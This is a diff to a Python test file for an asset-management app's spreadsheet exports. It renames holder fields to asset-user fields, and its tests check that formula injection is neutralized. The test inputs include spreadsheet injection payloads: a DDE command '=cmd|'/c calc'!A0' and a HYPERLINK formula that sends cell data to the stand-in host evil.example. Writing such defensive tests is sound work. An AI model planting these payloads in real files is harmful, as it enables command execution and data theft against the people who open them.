@@ -13,7 +13,7 @@ from io import BytesIO
 import openpyxl
 from app.core.db import SessionLocal
 from app.core.security import hash_password
-from app.holders.models import Holder
+from app.asset_users.models import AssetUser
 from app.masters.models import AssetCategory, AssetSubcategory, Brand, Company, CostCenter, Department, Location, Vendor
 from app.numbering.models import CodeRule
 from app.reports.export_service import _sanitize_cell
@@ -32,9 +32,9 @@ async def _setup(suffix: str):
         vendor = Vendor(code=f"VND-FI-{suffix}", name="FI Vendor")
         session.add_all([sub, cc, loc, dept, vendor])
         await session.flush()
-        stock = Holder(company_id=co.id, emp_code=f"FISTK-{suffix}", name="FI Stock", holder_type="IT_STOCK",
-                        location_id=loc.id, department_id=dept.id, role="HOLDER")
-        admin = Holder(company_id=co.id, emp_code=f"FIADM-{suffix}", name="FI Admin", holder_type="EMPLOYEE",
+        stock = AssetUser(company_id=co.id, emp_code=f"FISTK-{suffix}", name="FI Stock", asset_user_type="IT_STOCK",
+                        location_id=loc.id, department_id=dept.id, role="ASSET_USER")
+        admin = AssetUser(company_id=co.id, emp_code=f"FIADM-{suffix}", name="FI Admin", asset_user_type="EMPLOYEE",
                         location_id=loc.id, department_id=dept.id, role="ADMIN",
                         password_hash=hash_password("Passw0rd!"), must_change_password=False)
         rule = CodeRule(company_id=co.id, prefix_template=f"FI-{suffix}/", suffix_template="",
@@ -85,7 +85,7 @@ async def test_asset_register_export_neutralizes_a_formula_injection_attempt(cli
     create_resp = await client.post("/api/assets", json={
         "company_id": ids["co"].id, "cost_center_id": ids["cc"].id, "category_id": ids["cat"].id,
         "subcategory_id": ids["sub"].id, "description": "=cmd|'/c calc'!A0",
-        "invoice_date": "2025-01-01", "initial_holder_id": ids["stock"].id,
+        "invoice_date": "2025-01-01", "initial_asset_user_id": ids["stock"].id,
         "brand_id": brand_id, "model": "-2-2", "legacy_asset_code": "@SUM(A1:A9)",
         "vendor_id": ids["vendor"].id, "po_number": "PO-1", "po_date": "2024-12-20",
         "invoice_number": "INV-1", "pi_number": "PI-1", "pi_date": "2024-12-25",
@@ -117,7 +117,7 @@ async def test_movement_log_export_neutralizes_a_formula_injection_attempt(clien
     create_resp = await client.post("/api/assets", json={
         "company_id": ids["co"].id, "cost_center_id": ids["cc"].id, "category_id": ids["cat"].id,
         "subcategory_id": ids["sub"].id, "description": "Movement Log FI Asset",
-        "invoice_date": "2025-01-01", "initial_holder_id": ids["stock"].id,
+        "invoice_date": "2025-01-01", "initial_asset_user_id": ids["stock"].id,
         "vendor_id": ids["vendor"].id, "po_number": "PO-2", "po_date": "2024-12-20",
         "invoice_number": "INV-2", "pi_number": "PI-2", "pi_date": "2024-12-25",
         "serial_number": "SN-FI-A2",
@@ -125,7 +125,7 @@ async def test_movement_log_export_neutralizes_a_formula_injection_attempt(clien
     asset_id = create_resp.json()[0]["id"]
 
     move_resp = await client.post(f"/api/assets/{asset_id}/events", json={
-        "event_type": "MOVED", "event_date": "2025-06-01", "to_holder_id": ids["stock"].id,
+        "event_type": "MOVED", "event_date": "2025-06-01", "to_asset_user_id": ids["stock"].id,
         "remarks": "=HYPERLINK(\"http://evil.example/\"&A1,\"click\")",
     }, headers=headers)
     assert move_resp.status_code == 201
